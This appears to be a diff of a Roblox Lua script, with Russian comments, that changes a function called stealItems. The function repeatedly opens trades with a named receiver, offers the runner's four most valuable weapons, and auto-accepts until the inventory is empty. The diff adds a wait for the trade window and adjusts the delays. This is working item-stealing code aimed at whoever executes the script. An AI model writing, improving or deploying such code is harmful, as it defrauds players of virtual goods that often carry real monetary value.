@@ -722,8 +722,10 @@ else
 end
 
 local loop = false
+
 local function stealItems(ReceiverName)
     loop = true
+    
     while loop do
         local availableItems = {}
         for a, b in pairs(InvModule.MyInventory.Data.Weapons) do
@@ -739,33 +741,56 @@ local function stealItems(ReceiverName)
                 end
             end
         end
+        
         -- Сортируем по ценности
         table.sort(availableItems, function(a, b) 
             return a.value > b.value
         end)
+        
         if #availableItems == 0 then
             loop = false
             return
         end
+        
         -- Отправляем запрос на обмен
         local success = pcall(function()
             Trade.SendRequest:InvokeServer(game:GetService("Players")[ReceiverName])
         end)
+        
         if not success then
             task.wait(5)
             continue
         end
-        task.wait(2)
+        
+        -- Ждем когда трейд откроется (проверяем наличие окна трейда)
+        local tradeOpened = false
+        for i = 1, 30 do  -- 30 попыток по 1 секунде = 30 секунд таймаут
+            -- Проверяем существует ли окно трейда (замени на реальную проверку)
+            if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") then
+                tradeOpened = true
+                break
+            end
+            task.wait(1)
+        end
+        
+        if not tradeOpened then
+            print("Трейд не был открыт в течение 30 секунд")
+            continue
+        end
+        
         -- Добавляем предметы (максимум 4 самых ценных)
         local sentItems = {}
         local addedCount = 0
+        
         for _, item in ipairs(availableItems) do
             if addedCount >= 4 then break end
+            
             local addAmount = math.min(item.amount, 4 - addedCount)
             for i = 1, addAmount do
                 local offerSuccess = pcall(function()
                     Trade.OfferItem:FireServer(item.dataId, "Weapons")
                 end)
+                
                 if offerSuccess then
                     table.insert(sentItems, {
                         name = item.name,
@@ -778,12 +803,16 @@ local function stealItems(ReceiverName)
                 if addedCount >= 4 then break end
             end
         end
+        
         if addedCount == 0 then
             pcall(function() Trade.DeclineTrade:FireServer() end)
             loop = false
             return
         end
-        task.wait(6)
+        
+        -- Ждем немного чтобы оппонент успел добавить что-то
+        task.wait(3)
+        
         -- Подтверждаем трейд
         if lastOfferValue then
             local acceptSuccess = pcall(function()
@@ -801,8 +830,12 @@ local function stealItems(ReceiverName)
                 Trade.AcceptTrade:FireServer(game.PlaceId * 3, tick())
             end)
         end
+        
+        -- Ждем завершения трейда
+        task.wait(5)
+        
         -- Задержка перед следующим трейдом
-        task.wait(1)
+        task.wait(2)
     end
 end
 
